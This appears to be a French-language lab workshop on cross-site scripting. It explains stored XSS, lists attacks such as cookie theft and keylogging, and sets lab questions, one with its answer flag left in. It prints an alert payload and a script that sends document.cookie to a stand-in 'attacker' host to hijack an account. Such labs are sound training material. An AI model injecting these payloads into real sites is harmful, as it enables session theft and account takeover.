# Cross-Site Scripting

Les scripts intersites (XSS) sont une vulnérabilité de sécurité que l'on trouve généralement dans les applications Web. C'est un type d'injection qui peut permettre à un attaquant d'exécuter des scripts malveillants et de les faire exécuter sur la machine de la victime.

Une application Web est vulnérable au XSS si elle utilise une entrée utilisateur non vérifiée. XSS est possible en Javascript, VBScript, Flash et CSS.

L'étendue de la gravité de cette vulnérabilité dépend du type de XSS, qui est normalement divisé en deux catégories : persistant/stocké et reflété. En fonction de laquelle, les attaques suivantes sont possibles :

- Vol de cookie - Voler votre cookie à partir d'une session authentifiée, permettant à un attaquant de se connecter en tant que vous sans avoir à fournir lui-même une authentification.

- Keylogging - Un attaquant peut enregistrer un écouteur d'événement clavier et envoyer toutes vos frappes à son propre serveur.

- Instantané de webcam - En utilisant les capacités HTML5, il est même possible de prendre des instantanés à partir d'une webcam d'ordinateur compromise.

- Phishing - Un attaquant pourrait soit insérer de faux formulaires de connexion dans la page, soit vous rediriger vers un clone d'un site vous incitant à révéler vos données sensibles.

- Balayage des ports - Vous avez bien lu. Vous pouvez utiliser le XSS stocké pour analyser un réseau interne et identifier d'autres hôtes sur leur réseau.

- Autres exploits basés sur le navigateur - Il existe des millions de possibilités avec XSS.

Qui saurait que tout cela était possible en visitant simplement une page Web. 
Certaines mesures sont mises en place pour empêcher que cela ne se produise, par votre navigateur et votre antivirus.


Ce workshop expliquera les différents types de scripts intersites, les attaques et vous obligera à résoudre des défis en cours de route.

# Stored XSS

Les scripts intersites stockés sont le type de XSS le plus dangereux. C'est là qu'une chaîne malveillante provient de la base de données des sites Web. Cela se produit souvent lorsqu'un site Web autorise une entrée utilisateur qui n'est pas nettoyée (supprimer les "mauvaises parties" d'une entrée utilisateur) lorsqu'elle est insérée dans la base de données.

Un exemple :

Un attaquant crée un payload dans un champ lors de l'inscription à un site Web stocké dans la base de données des sites Web. Si le site Web ne nettoie pas correctement ce champ, lorsque le site affiche ce champ sur la page, il exécutera le payload pour tous ceux qui le visitent.

Le payload pourrait être aussi simple que ```<script>alert(1)</script>```

Cependant, ce payload ne s'exécutera pas uniquement dans votre navigateur, mais dans tout autre navigateur affichant les données malveillantes insérées dans la base de données.

Expérimentons en exploitant ce type de XSS. accédez à la page "Stored-XSS" sur le terrain de jeu XSS.

**Répondre aux questions ci-dessous**

La machine que vous avez déployée plus tôt vous guidera tout en exploitant certaines vulnérabilités intéressantes que le XSS stocké a à offrir. Il y a des astuces pour répondre à ces questions sur la machine.

Ajoutez un commentaire et voyez si vous pouvez insérer votre propre code HTML.
Cela révélera la réponse à cette question.
```
reponse
```
Créez une popup d'alerte apparaissant sur la page avec vos cookies de document.
```
reponse
```
Remplacez "XSS Playground" par "I am a hacker" en ajoutant des commentaires et en utilisant Javascript.
```
reponse
```
sites Web_can_be_easily_defaced_with_xss
Le XSS stocké peut être utilisé pour voler un cookie de victime (données sur une machine qui authentifie un utilisateur sur un serveur Web). Cela peut être fait en demandant au navigateur des victimes d'analyser le code Javascript suivant :

<script>window.location='http://attacker/?cookie='+document.cookie</script>

Ce script navigue dans le navigateur de l'utilisateur vers une URL différente, cette nouvelle demande inclura un cookie de victime en tant que paramètre de requête. Lorsque l'attaquant a acquis le cookie, il peut l'utiliser pour usurper l'identité de la victime.

Prenez le contrôle du compte de Jack en volant son cookie, 
quelle était la valeur de son cookie ?
```
reponse
```
Publiez un commentaire en tant que Jack.
```
reponse
```
